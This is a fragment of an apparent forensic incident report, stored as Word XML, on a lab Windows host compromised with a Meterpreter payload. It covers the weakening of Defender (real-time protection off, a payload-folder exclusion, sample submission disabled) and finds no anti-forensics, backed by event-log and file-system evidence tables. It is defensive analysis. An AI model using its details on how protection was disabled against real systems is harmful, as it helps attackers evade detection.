        <w:t>Defender 1116/1117 (Trojan:Win64/Meterpreter.E) appear only at 10:16–10:19. There is no detection of C:\Payloads\pscp.exe, C:\Payloads\test.exe or C:\Users\medmondson\1.exe afterwards, consistent with the path exclusion and RTP being off.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>This finding adds to F-004 the persisted registry state and how the 11:02 disable was done. The change was made interactively through the Windows Security GUI: SecurityHealthHost was started via DcomLaunch, UAC consent.exe ran, and MsMpEng wrote the value itself. No Set-MpPreference or reg.exe command line was involved, which matches a Tamper-Protection-compliant UI toggle by the logged-on user medmondson (the lab operator acting as the "victim/attacker"). The protection weakening was still in place when the evidence was collected. It explains why the Meterpreter payload, which Defender had detected three times when it was downloaded, could execute without being blocked from the excluded C:\Payloads\ folder. Remediation must restore RTP, remove the exclusion and re-enable MAPS/sample submission.</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11:02:11.558959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1447</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Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | C:\Payloads\=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1456</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SpyNetReporting=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247111</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SubmitSamplesConsent=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#1444</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (exclusions)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>exclusion: regf_mtime</w:t>
              <w:br/>
              <w:t>type=Paths | value=C:\Payloads\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/defender.exclusions.jsonl#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:09.773548</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>consent.exe 6492 420 0000019A5C0280F0</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 5392, ProcessGUID: e6e9f951-0db1-654e-8301-000000000500 | RuleName: - | MD5=EE2A1C85C472F89B146CC8EE598CCCBC,SHA256=19FD0010DA92B654D1CA270247061A39EA13C0A58529FD8257A97E2EF7794911,IMPHASH=522D83761201075834F05037F5307949 | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18635</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.356955</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\SecurityHealthHost.exe {6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF} -Embedding</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 2708, ProcessGUID: e6e9f951-0db3-654e-8401-000000000500 | RuleName: - | MD5=18CB1CDF0666FF08918BADE605087CEC,SHA256=4CB149DB4441B25F3C837B97477BF5A81C51735D76B123D396AA214FED100522,IMPHASH=588F984996756BEE8EBFE48A7299428F | ParentProcess: C:\Windows\Sy</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18636</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:11.567907</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 6388, ProcessGUID: e6e9f951-0b81-654e-1901-000000000500 | RuleName: T1089,Tamper-Defender | Image: C:\ProgramData\Microsoft\Windows Defender\platform\4.18.23100.2009-0\MsMpEng.exe | EventType: SetValue | TargetObject: HKLM\SOFTWARE\Microsoft\</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18637</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.113188</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 13 | Microsoft-Windows-Sysmon | RegistryEvent (Value Set) | ProcessID: 632, ProcessGUID: e6e9f951-0900-654e-0b00-000000000500 | RuleName: T1031,T1050 | Image: C:\Windows\system32\services.exe | EventType: SetValue | TargetObject: HKLM\System\CurrentControlSet\Services\WdNisDrv\Start | Details: DWORD (0x00000003)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18638</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:02:12.400713</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | Windows Defender Antivirus</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23752</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452</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 New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\ = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23724</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-018: No log clearing, timestomping, wiping, Prefetch/EVTX deletion or time tampering attributable to the attacker; PowerShell transcripts of the Meterpreter session preserved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artifact:recycle bin ($i)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>anti-forensics</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1070.001, T1070.004, T1070.006, T1562.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058742 → 2023-11-10 11:38:59.162328</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>What was checked, and the results:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) Log clearing: there is no Security 1102 and no System/Eventlog 104. The 1102/104 IDs present belong to unrelated providers (ShellCommon-StartLayoutPopulation, ModernDeployment, StateRepository, Pushrouter). Security 1100 (event log service shutdown) appears at 2023-11-09 11:22:20, 2023-11-10 10:15:13 and 10:41:53, all before the attack; these are normal reboots (evtxecmd_0.csv#25930, #26729). EventRecordID sequences are contiguous with no gaps: Security 1–2630, System 1–447, Sysmon 1–5013, PowerShell/Operational 1–375, Windows PowerShell 1–347, Defender/Operational 1–54.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(2) System time: 4616 and Kernel-General 1 occur only during OOBE on 2023-11-09 11:02:41–11:02:47 (svchost, LogonId 0x3E5, OldTime 19:00:30 → 11:02:41; #25172, #27708) plus time-zone adjustments (#27729). Nothing on 2023-11-10.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(3) Timestomping: $MFT records for C:\Payloads\pscp.exe (#115203), test.exe (#109630), C:\Users\medmondson\1.exe (#119927), $RHOVDEL.exe (#115196) and Desktop\not_my_pass.txt (#112639) all have SI&lt;FN=False and uSecZeros=False. The SI&lt;FN=True files created after 10:00 are VC++ 2015-2019 redistributable DLLs (System32/SysWOW64, $SI 2020-06-16), VMware Tools, .NET 6.0.24 and KAPE binaries, i.e. installer-preserved timestamps.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(4) Deletions: in $J during the session (11:03–11:21) the FileDelete records are OneDrive self-update, Windows Update tw-/tpm-*.tmp in C:\Windows\Temp, PSScriptPolicyTest files and an MpCmdRun lock. No .pf or .evtx was deleted. No sdelete, cipher, CCleaner or BleachBit appears in Prefetch or $J. The only pscp.exe deletions are Defender remediation at 10:16:44, 10:17:54 and 10:19:36 (usnjrnl.csv#85220).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(5) Recycle Bin (rbcmd_0.csv): $IHOVDEL.exe = Downloads\pscp.exe at 10:20:20 (already F-014); $IY8CUX9.xml = Desktop\sysmon-config.xml at 10:28:22; $IX8NRQ1.txt = C:\Transcript\20231110\PowerShell_transcript...c4CYCMv_.20231110025534.txt at 10:56:07. The last two are lab setup, before the 11:03 execution.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(6) PowerShell logging was not disabled. The transcripts covering the attack are still allocated in C:\Transcript\20231110\: ...6HrokibP.20231110030258.txt (11:02:58, PowerShell 1088 that launched pscp.exe, #116397), ...4_WbZ_YN.20231110030640.txt (11:06:40, MSFConsole host in explorer, #119921), ..._h_Jx2Ns.20231110030910.txt (11:09:10–11:11:19, powershell 736 / 1.exe download, #119924), ...4J+ewEfr.20231110031845.txt (#113433). 4104 script-block events are still present.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(7) wevtutil.exe at 10:52:42–10:52:43 (#18461, #18466), along with the Sysmon 12 DeleteKey of the WINEVT\Channels\...Windows Defender/Operational key, comes from MsMpEng.exe running uninstall-manifest/install-manifest during the Defender platform update. It is not log clearing.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(8) Sysmon: one EID 16 config change at 10:51:10 (installation) and EID 4 at 10:51:11. EID 255 at 12:29:39 falls in the KAPE window. The Sysmon EID 2 (file creation time changed) events are the .NET 4.5.2 web installer at 11:38:59 (#19971), which is benign.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Nothing in the available artifacts shows the attacker covering tracks. The Meterpreter operator did not run clearev, timestomp or file deletion. Logs are complete (contiguous RecordIDs), and the payload and downloaded copies keep consistent $SI/$FN timestamps and their Zone.Identifier. The only defense evasion is the Defender weakening (F-004/F-017) and in-memory process injection (F-005). Limits: in-memory-only activity is not visible, and the Sysmon 13 coverage from the SwiftOnSecurity configuration is selective. Confidence is 'probable' because this is a negative result (absence of evidence), although all the relevant sources (EVTX, $MFT, $J, $LogFile, Prefetch, Recycle Bin) were available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (14)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10:15:13.719781</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 1100 | Microsoft-Windows-Eventlog | The event logging service has shut down</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25930</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:41:53.837229</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 1100 | Microsoft-Windows-Eventlog | The event logging service has shut down</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#26729</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:41.058859</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2023-11-09 19:00:30.0951550 | NewTime: 2023-11-09 11:02:41.0583308 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#25172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
